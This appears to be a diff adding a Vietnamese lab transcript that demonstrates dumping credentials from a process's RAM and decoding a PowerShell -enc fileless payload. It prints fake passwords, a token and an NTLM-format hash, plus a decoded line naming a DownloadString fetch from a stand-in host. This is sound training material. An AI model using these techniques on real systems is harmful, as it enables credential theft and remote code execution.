@@ -1,0 +1,23 @@
+# Transcript lab 6.4 - moi credential tu RAM + giai payload -enc (fileless)
+# Moi truong: WSL2 Ubuntu, Python 3.11.9, ptrace_scope=1, chay khong can root
+# Chay: 2026-10-18T10:31:56Z UTC
+# Tat ca credential/hash deu GIA, vo hai. Chuoi -enc giai ra mot lenh VO HAI (khong chay).
+
+$ DUMPDIR=_dump python3 -I capture.py
+[*] victim PID = 47639
+[*] da chup 18 vung, 5304320 byte (~5.1 MB) -> _dump/victim.dump
+
+$ DUMPDIR=_dump bash solve.sh
+== 1. Moi credential bang strings + grep theo pattern ==
+password=Pa$$w0rd_LAB64
+api_token=tok_live_LAB64_deadbeefcafe0001
+
+== 2. Hash kieu NTLM (dinh dang user:rid:lm:nt) ==
+ntlm=LAB64user:1001:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef
+
+== 3. Chuoi -enc kieu PowerShell (base64 UTF-16LE) trong RAM ==
+PSENC (rut gon): VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiADYA...
+
+== 4. Giai -enc: base64 -d | iconv UTF-16LE -> lenh that ==
+Write-Output 'lab64 fileless demo: would DownloadString http://198.51.100.77/a.ps1'
+(Giai dung phai qua iconv UTF-16LE; bo buoc do se ra chuoi co byte null xen ke.)
